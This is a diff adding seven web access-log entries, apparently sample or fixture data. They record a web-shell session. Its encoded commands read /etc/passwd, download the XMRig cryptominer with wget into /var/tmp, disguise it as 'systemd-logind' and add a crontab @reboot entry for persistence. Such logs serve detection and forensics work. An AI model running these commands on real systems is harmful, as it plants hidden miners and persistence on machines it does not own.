@@ -1,0 +1,7 @@
+{"c-ip": "138.124.123.107", "cs-method": "GET", "c-uri": "/olZCkl?z=id", "sc-status": 200, "c-useragent": "Mozilla/5.0"}
+{"c-ip": "138.124.123.107", "cs-method": "GET", "c-uri": "/olZCkl?z=ps%20aux%20--sort%3D-%25cpu%20%7C%20awk%20%27%243%20%3E%2050%20%7Bprint%20%242%2C%20%243%2C%20%2411%7D%27%20%7C%20head%20-20", "sc-status": 200, "c-useragent": "Mozilla/5.0"}
+{"c-ip": "138.124.123.107", "cs-method": "GET", "c-uri": "/olZCkl?z=awk%20-F%3A%20%27%243%20%3E%3D%201000%27%20/etc/passwd%20%7C%20head%20-20", "sc-status": 200, "c-useragent": "Mozilla/5.0"}
+{"c-ip": "138.124.123.107", "cs-method": "GET", "c-uri": "/olZCkl?z=cd%20/var/tmp%20%26%26%20wget%20--no-check-certificate%20https%3A//github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz%20-O%20xmrig.tar.gz%202%3E%261", "sc-status": 200, "c-useragent": "Mozilla/5.0"}
+{"c-ip": "138.124.123.107", "cs-method": "GET", "c-uri": "/olZCkl?z=cd%20/var/tmp%20%26%26%20chmod%20777%20systemd-logind%202%3E%261", "sc-status": 200, "c-useragent": "Mozilla/5.0"}
+{"c-ip": "138.124.123.107", "cs-method": "GET", "c-uri": "/olZCkl?z=systemctl%20list-units%20--type%3Dservice%20--all", "sc-status": 200, "c-useragent": "Mozilla/5.0"}
+{"c-ip": "138.124.123.107", "cs-method": "GET", "c-uri": "/olZCkl?z=%28crontab%20-l%202%3E/dev/null%3B%20echo%20%22%40reboot%20...%22%29%20%7C%20crontab%20-", "sc-status": 200, "c-useragent": "Mozilla/5.0"}
